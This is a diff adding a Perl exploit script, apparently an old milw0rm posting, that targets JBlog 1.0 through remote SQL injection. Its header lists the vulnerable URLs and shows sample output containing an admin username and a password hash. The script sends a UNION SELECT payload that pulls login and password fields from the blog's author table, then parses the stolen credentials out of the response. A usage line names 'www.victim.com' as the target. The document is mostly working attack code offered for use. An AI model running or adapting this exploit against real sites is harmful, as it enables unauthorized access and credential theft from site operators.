@@ -1,0 +1,95 @@
+##################################################
+#	Script....................................: JBlog ver 1.0
+#	Script Site...........................: http://www.jmuller.net/jblog/index.php
+#	Vulnerability........................: Remote SQL injection Exploit
+#	Access..................................: Remote
+#	level......................................: Dangerous
+#	Author..................................: S4mi 
+#	Contact.................................: S4mi[at]LinuxMail.org 
+##################################################
+#Special Greetz to : Simo64, DrackaNz, Coder212, Iss4m, HarDose, r0_0t, ddx39 .....
+#
+##################################################
+#Vuln :
+#http://127.0.0.1/jblog/index.php?id=[SQL]
+#http://127.0.0.1/jblog/admin/modifpost.php?id=[SQL]  (shoud have access to admin area "use my last JBlog Xploit")
+#Probably Other files are affected
+#*************************************
+#Usage  :       C:\Xploit.pl  127.0.0.1  /Jblog/
+#Result Screen Shout :
+#*************************************
+# Connecting ...[OK]
+# Sending Data ...[OK]
+#
+#  + Exploit succeed! Enjoy.
+#  + ---------------- +
+#  + Password: e10adc3949ba59abbe56e057f20f883e
+#  + Username: admin
+###################################################
+
+#!/usr/bin/perl
+
+use IO::Socket ;
+
+&header();
+
+&usage unless(defined($ARGV[0] && $ARGV[1]));
+
+$host = $ARGV[0];
+$path = $ARGV[1];
+
+syswrite STDOUT ,"\n Connecting ...";
+
+my $sock = new IO::Socket::INET ( PeerAddr => "$host",PeerPort => "80",Proto => "tcp",);
+								
+die "\n Unable to connect to $host\n" unless($sock);
+
+syswrite STDOUT, "[OK]";
+
+$inject = "union%20select%200,login,pass,3,4,5%20from%20auteur%20WHERE%20id=1/*";	
+
+syswrite STDOUT ,"\n Sending Data ...";
+
+print $sock "GET $path/index.php?id='$inject HTTP/1.1\n";
+print $sock "Host: $host\n";
+print $sock "Referer: $host\n";
+print $sock "Accept-Language: en-us\n";
+print $sock "Content-Type: application/x-www-form-urlencoded\n";
+print $sock "User-Agent: Mozilla/5.0 (BeOS; U; BeOS X.6; en-US; rv:1.7.8) Gecko/20050511 Firefox/1.0.4\n";
+print $sock "Cache-Control: no-cache\n";
+print $sock "Connection: Close\n\n";
+
+syswrite STDOUT ,"[OK]\n\n";
+
+while($answer = <$sock>){
+
+if ($answer =~ /class='titre'>(.*?)<\/span>/){
+print "+ Exploit succeed! Enjoy.\n";
+print "+ ---------------- +\n";
+print "+ Password: $1\n";
+}	
+if($answer =~ / '(.*?)' /){
+print "+ Username: $1\n";
+}
+}
+
+sub usage{
+	print "\nUsage   : perl $0 host /path/ ";
+	print "\nExemple : perl $0 www.victim.com /JBlog/\n";
+	exit(0);
+}
+sub header(){
+print q(
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Script.................: JBlog ver 1.0
+Script Site............: http://www.jmuller.net/jblog/index.php
+Vulnerability..........: Remote SQL injection Exploit
+Access.................: Remote
+level..................: Dangerous 
+Author.................: S4mi
+Contact................: S4mi[at]LinuxMail.org 
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+);
+}
+
+# milw0rm.com [2007-09-14]
